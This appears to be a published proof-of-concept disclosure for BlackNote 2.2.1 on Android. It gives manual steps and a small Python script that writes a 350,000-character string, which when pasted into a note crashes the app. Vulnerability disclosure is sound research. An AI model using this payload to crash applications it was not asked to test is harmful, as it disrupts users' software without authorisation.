    # Exploit Title: Blacknote 2.2.1 - Denial of Service (PoC)
    # Date: 2021-06-02
    # Author: Brian Rodríguez
    # Download Link: https://play.google.com/store/apps/details?id=notepad.note.notas.notes.notizen&hl=es_MX
    # Version: 2.2.1
    # Category: DoS (Android)

    ##### Vulnerability #####

    BlackNote Bloc de notas is vulnerable to a DoS condition when a long list of characters is being used when creating a note:

    # STEPS #
    # Open the program.
    # Create a new Note.
    # Run the python exploit script payload.py, it will create a new payload.txt file
    # Copy the content of the file "payload.txt"
    # Paste the content from payload.txt twice in the new Note.
    # Crashed

    Successful exploitation will cause the application to stop working.

    I have been able to test this exploit against Android 8.0.

    ##### PoC #####
    --> payload.py <--
    #!/usr/bin/env python
    buffer = "\x41" * 350000

    try:
        f = open("payload.txt","w")
        f.write(buffer)
        f.close()
        print ("File created")
    except:
        print ("File cannot be created")